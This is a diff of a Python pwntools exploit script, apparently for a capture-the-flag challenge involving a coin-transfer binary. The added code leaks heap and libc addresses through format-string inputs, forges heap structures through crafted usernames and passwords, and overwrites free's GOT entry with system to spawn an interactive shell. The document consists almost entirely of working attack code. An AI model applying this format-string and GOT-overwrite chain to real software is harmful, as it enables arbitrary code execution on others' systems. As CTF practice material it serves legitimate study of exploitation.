@@ -15,8 +15,8 @@ pwn_rop = rop.ROP(pc)
 
 uselibc = 2 #0 for no,1 for i386,2 for x64
 local = 1
-haslibc = 0
-atta = 1
+haslibc = 1
+atta = 0
 
 if uselibc == 2:
 	context.arch = "amd64"
@@ -49,7 +49,7 @@ context.log_level = True
 
 if local:
 	if atta:
-		gdb.attach(p,'b *0x401474\n')
+		gdb.attach(p,'b *0x401474\n b *0x400c8a\n b *0x400bf7\n b *0x401717')
 
 
 def sla(a,b):
@@ -90,25 +90,69 @@ def send_coin(name,cnt):
 def display_trans():
 	sla('> ','3')
 
+def change_password(password):
+	sla('> ','4')
+	sla('> ',password)
+
 def delete():
 	sla('> ','5')
 
 def logout():
 	sla('> ','6')
 
+def leak_addr(formats):
+	sa('> ',formats)
+
 def hack():
 	raw_input()
-	register('a','a')
+	free_got = pwn_elf.got['free']
+
+	register('a','/bin/sh\0')
 	register('b','b')
 	register('c','c')
+	login('c','c')
+	for i in range(0x2f):
+		send_coin('c',1)
+	leak_addr("%9$p")
+	ru(': ')
+	heap_addr = int(rv(8),16)
+	lg('heap_addr',heap_addr)
 
-	login('a','a')
-	send_coin('b',0x604250)
+	leak_addr("%3$p")
+	ru(': ')
+	libc.address = int(rv(14),16) - libc.symbols['write'] - 0x10
+	lg('libc',libc.address)
+	free_addr = libc.symbols['free']
+	system_addr = libc.symbols['system']
+	logout()
+
+
+	login('a','/bin/sh\0')
+	userb_pass = heap_addr - 0x30
+	send_coin('b',userb_pass)
 	logout()
 
 	login('b','b')
+	change_password('\x00'*16 + p64(0x30))
 	send_coin('b',1000)
 	delete()
 
+	login('a','/bin/sh\0')
+	send_coin('c',1)
+	logout()	
+
+	userc_struct = heap_addr - 0x130 + 0x120
+	payload = p64(userc_struct)
+	register(payload,'d')
+
+	payload = p64(userc_struct+0x40) + p64(free_got) 
+	register('/bin/sh\0',payload)
+
+	login('c',p64(free_addr))
+	change_password(p64(system_addr))
+	logout()
+
+	login('a','/bin/sh\0')
+	delete()
 	p.interactive()
 hack()
